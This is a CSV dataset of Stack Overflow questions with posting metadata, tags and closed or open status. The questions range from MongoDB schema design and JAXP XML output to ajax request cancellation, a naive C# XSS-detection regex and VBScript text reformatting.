PostId,PostCreationDate,OwnerUserId,OwnerCreationDate,ReputationAtPostCreation,OwnerUndeletedAnswerCountAtPostTime,Title,BodyMarkdown,Tag1,Tag2,Tag3,Tag4,Tag5,PostClosedDate,OpenStatus
6046168,05/18/2011 14:14:05,543315,09/17/2010 10:15:06,1,2,For Mongodb is it better to reference an object or use a natural String key?,"I am building a corpus of indexed sentences in different languages. I have a collection of Languages which have both an ObjectId and the ISO code as a key. Is it better to use a reference to the Language collection or store a key like ""en"" or ""fr""?

I suppose it's a compromise between:

 - ease of referencing the Language
 - object in that collection
 - speed in doing queries where the sentence has a certain language
 - the size of the data on disk

Any best practices that I should know of?",mongodb,,,,,,open
4873911,02/02/2011 11:30:10,465076,10/03/2010 09:30:58,192,24,How to insert schemalocation in a xml document via DOM,"i create a xml document with JAXP and search a way to insert the schemalocation.
At the moment my application produces:

    <?xml version=""1.0"" encoding=""UTF-8""?>
    <root>
    ...
    </root>

But i need:

    <?xml version=""1.0"" encoding=""UTF-8""?>
    <root xmlns=""namespaceURL"" 
    xmlns:xs=""http://www.w3.org/2001/XMLSchema-instance""
    xs:schemaLocation=""namespaceURL pathToMySchema.xsd"">
    ...
    </root>

My code:

    StreamResult result = new StreamResult(writer);
    Document doc = getDocument();

    Transformer trans = transfac.newTransformer();
    trans.setOutputProperty(OutputKeys.INDENT, ""yes"");
    trans.setOutputProperty(OutputKeys.METHOD, ""xml"");
    trans.setOutputProperty(OutputKeys.VERSION, ""1.0"");
    trans.setOutputProperty(OutputKeys.ENCODING, ""UTF-8"");

    DOMSource source = new DOMSource(depl.getAsElement(doc));
    trans.transform(source, result);


Thanks for your time,  
Kasten",dom,xsd,jaxp,,,,open
3311559,07/22/2010 17:21:54,406143,07/22/2010 16:58:20,1,0,Too many lookup tables ,"What are the adverse effects of having too many lookup tables in the database?

 I have to incorportate too many Enumerations, based on the applications. 

What would experts advice?",sql-server,database-design,enums,,,,open
9990413,04/03/2012 09:18:39,851755,07/19/2011 10:22:40,4,1,What is this PHP code in VB.net,"I am looking for the vb.net equivalent of this function: I have no experience of PHP but came across this code which apparently gives you a random image url from google images 

        function GetRandomImageURL($topic='', $min=0, $max=100)
    {
      // get random image from Google
      if ($topic=='') $topic='image';
      $ofs=mt_rand($min, $max);
      $geturl='http://www.google.ca/images?q=' . $topic . '&start=' . $ofs . '&gbv=1';
      $data=file_get_contents($geturl);
     
      $f1='<div id=""center_col"">';
      $f2='<a href=""/imgres?imgurl=';
      $f3='&amp;imgrefurl=';
     
      $pos1=strpos($data, $f1)+strlen($f1);
      if ($pos1==FALSE) return FALSE;
      $pos2=strpos($data, $f2, $pos1)+strlen($f2);
      if ($pos2==FALSE) return FALSE;
      $pos3=strpos($data, $f3, $pos2);
      if ($pos3==FALSE) return FALSE;
      return substr($data, $pos2, $pos3-$pos2);
    }",php,vb.net,,,,04/15/2012 21:12:48,too localized
10421966,05/02/2012 21:25:01,603588,02/04/2011 18:05:34,334,14,Spring-Data mongodb querying multiple classes stored in the same collection,"With Spring-Data, you can use the @Document annotation to specify which collection to save the object to.  Say i have two classes, Student and Teacher, both persisted into the people collection.  When I execute the following code:

    mongo.find(new Query(), Teacher.class);

result contains both Student and Teacher.  Looking in the data created by Spring-Data, each document contains a ""_class"" field which indicate which class it is persisted from.  

This is field not used in find as an filter to return only Teacher?  How do I query if I only want to return Teacher saved in the people collection?",mongodb,spring-data,,,,,open
8616154,12/23/2011 12:36:28,787158,06/07/2011 09:13:37,20,0,stop ajax function in midway when other element is clicked,"Hi have a page which has List data. 

When I click on an element of the list, an Ajax function is called which populates some date in the right column.

Now wat's working:-

i click on element -> i see the loading.gif a few seconds -> data gets loaded.

When i click on other element midway, the first function completes and only then the second request is taken.

What I want:-

when i click and the ajax is loading, I click again in between, the previous function should stop, and my new request should be taken. ",jquery,ajax,,,,,open
1520973,10/05/2009 16:10:03,80229,03/19/2009 21:13:16,95,10,Regex to detect Javascript In a string,"I am trying to detect JavaScript in my querystrings value.

I have the following c# code

        private bool checkForXSS(string value) 
        {
            Regex regex = new Regex(@""/((\%3C)|<)[^\n]+((\%3E)|>)/I""); 

            if (regex.Match(value).Success) return true; 
            
            return false; 
        }

This works for detecting `<script></script>` tags but unfortunately if there were no tags a match is not reached.

Is it possible for a regex to match on JavaScript keywords and semi-colons etc?

Thanks",regex,xss,c#,javascript,,,open
5528942,04/03/2011 10:12:59,667355,03/19/2011 14:04:57,32,0,List of all .txt file,"I want to write a program that give a path in my system and goes to that path and search in that path and sub-directory of path and list all of .txt file . 
please help me .
thanks .",c++,c,qt,qt4,,04/07/2011 05:46:46,not a real question
4344698,12/03/2010 10:37:44,447244,09/01/2010 09:10:05,1,0,I want to design an invitation card for my wedding in silverlight ,"I want to make an Application in Silverlight for invitation of marriage 

Showing some Animation stuff",silverlight-4.0,,,,,01/08/2012 21:15:49,too localized
7910832,10/27/2011 01:37:33,1015681,10/27/2011 01:28:41,1,0,VB Script To Delete Header and Footer plus Append Text while exporting to new text file,"Hi All VB Script Gurus,

I am new to VB script world.

I need some help on creating new VB script for the text file changes:

I am receiving below sample text file data and needs to modify (append data) and export to new text file.

OP01AMS06902APECS 20110905154741 2 T.M.FINAP033.00120110905034752 (header portion of the text file needs to validated and removed while exporting to new file)
6301405159509 0000000700 20110504 110.00 USD 0000077191 US Auto Fo US Auto Fo 100000 ABC Fort Worth TX 76137
6301405159509 0009000015 20110726 200.00 USD 0000077897OL00000001Vamsi Vamsi vamsi house 123 
CL99AMS06902APECS 20110905154741 2 T.M.FINAP033.00120110905034752 (trailer portion of the file needs to validated and removed while exporting to new file)

And while exporting to new file I need to append constant records data in each single row.

For instance for the first above record apart of the existing data I need to append 58 constant record data for reach row.

000001(constant) 0000000 (constant) 6301405159509 0000000700 20110504 110.00 USD 0000077191 US Auto Fo US Auto Fo 100000 ABC Fort Worth TX 76137

All constants are fixed values with specifc length.

Any help or sample scripts will be greatly appreciated.

Thanks
Shakee",vb,,,,,10/27/2011 03:24:58,too localized
